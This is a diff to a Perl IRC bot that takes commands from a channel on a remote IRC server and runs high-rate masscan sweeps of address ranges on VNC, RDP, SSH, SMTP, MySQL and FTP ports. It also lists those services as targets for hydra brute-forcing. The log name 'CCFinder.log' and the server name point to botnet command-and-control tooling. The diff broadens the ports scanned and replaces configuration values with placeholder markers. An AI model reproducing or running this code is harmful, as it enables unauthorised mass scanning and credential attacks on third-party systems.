@@ -6,19 +6,20 @@ use feature 'say';
 use Fcntl qw(:flock SEEK_END);
 my $filename = 'CCFinder.log';
 $|=1;
-my @VNC_PORTS = qw/'5900 5901'/;
+#defineportshere
 my @hydra_PORTS = qw/'3389 22 3306 21 445 139 25/';
 use Mojo::IOLoop;
-my $forktimeout = 12;
-my $maxforks = 1234;
-my $noticechan = '@#x';
-my $channel = '#x';
+#definetimeouthere
+#defineforkshere
+#definechanhere
+#definenoticechanhere
+
 my $irc = Mojo::IRC->new(
- nick => 'X'.int(rand(99999)),
+#definenickhere
  user => 'VNCScan',
  server => 'irc-4.iownyour.biz:6697',
  );
-$irc->tls({insecure => 1});
+#definesslhere
 $irc->on(irc_rpl_welcome => sub {
  my($irc, $err) = @_;
  warn 'Joined IRC server.';
@@ -73,7 +74,7 @@ $irc->on(irc_privmsg => sub {
     if ($msg =~ /@.scan ([^\s]+)/) {
      $s->progress("[Info] Starting masscan... [VNC Scan in progress ...]");
      my $range = $1;
-     my $masscancmd = "masscan -p 5900 --range $range --rate 30000 --open --banners -oG hosts.txt ";
+     my $masscancmd = "masscan -p 5900,3389,22,25,3306,21 --range $range --rate 25000 --open --banners -oG hosts.txt ";
      warn "Received rangescan request on $range , running masscan...";
      my $r = `$masscancmd`;
      push @IRC_RESULTS, $_ foreach split "\n", $r;
